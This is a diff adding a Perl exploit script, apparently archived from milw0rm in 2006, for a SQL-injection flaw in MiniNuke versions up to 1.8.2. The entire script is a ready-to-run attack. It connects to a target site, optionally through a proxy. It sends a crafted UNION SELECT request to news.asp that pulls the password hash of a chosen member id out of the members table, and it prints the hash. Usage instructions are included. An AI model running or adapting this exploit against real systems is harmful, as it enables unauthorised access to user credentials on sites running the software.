@@ -1,0 +1,53 @@
+#!/usr/bin/perl
+
+# MiniNuke (www.miniex.net) Version: <= 1.8.2  SQL-injection exploit.
+# This exploit uses the vulnerability discovered by nukedx@nukedx.com.
+# Exploit uses SQl-injection to give you the hash from user with chosen id.
+# DetMyl, 2006 Detmyl@bk.ru 
+
+use IO::Socket;
+
+if (@ARGV < 3)
+ {
+ print q(
+ +++++++++++++++++++++++++++++++++++++++++++++++++++
+ Usage: perl mini-nuke.pl [site] [dir] [useId] [proxy (optional)] 
+ i.e. perl mini-nuke.pl "somesite.com" / 52 127.0.0.1:3128
+ ++++++++++++++++++++++++++++++++++++++++++++++++++++
+           );   
+ exit;
+ } 
+$serv  = $ARGV[0];
+$dir   = $ARGV[1];
+$uid = $ARGV[2];
+$proxy   = $ARGV[3];
+
+print "----------------------------------\n";
+if ( defined $proxy) {
+	$proxy =~ s/(http:\/\/)//eg;
+	($proxyAddr,$proxyPort) = split(/:/, $proxy);
+   }
+$serv =~ s/(http:\/\/)//eg;
+$request ="http://".$serv.$dir."news.asp?Action=Print&hid=66%20union+select+0,sifre,0,0,0,0,0,0,0,0+from+members+where+uye_id=".$uid;
+print "Connecting to: $serv...\n";
+print $proxy?"Using proxy: $proxy \n":"";
+$socket = IO::Socket::INET->new( Proto => "tcp",
+				 PeerAddr => $proxyAddr?"$proxyAddr":"$serv",
+				 PeerPort => $proxyPort?"$proxyPort":"80") 
+				 || die "can't connect to: $serv\n";
+print $socket "GET $request HTTP/1.1\n";
+print $socket "Host: $serv\n";
+print $socket "Accept: */*\n";
+print $socket "Connection: close\n\n";
+print "+ Connected!...\n";
+	while($answer = <$socket>) {
+		if ($answer =~ /<b>([\d,a-f]{32})<\/b>/) { 
+			print "+ Found! The hash for user $uid: $1\n";
+			print "----------------------------------\n";
+			  exit(); }
+		if ($answer =~ /number of columns/) { print "+ Vulnerable! But no result with default querry, so manually change the scrypt;-)...\n";exit(); }
+	}
+print "Exploit failed\n";
+print "--------------------------\n";
+
+# milw0rm.com [2006-01-14]
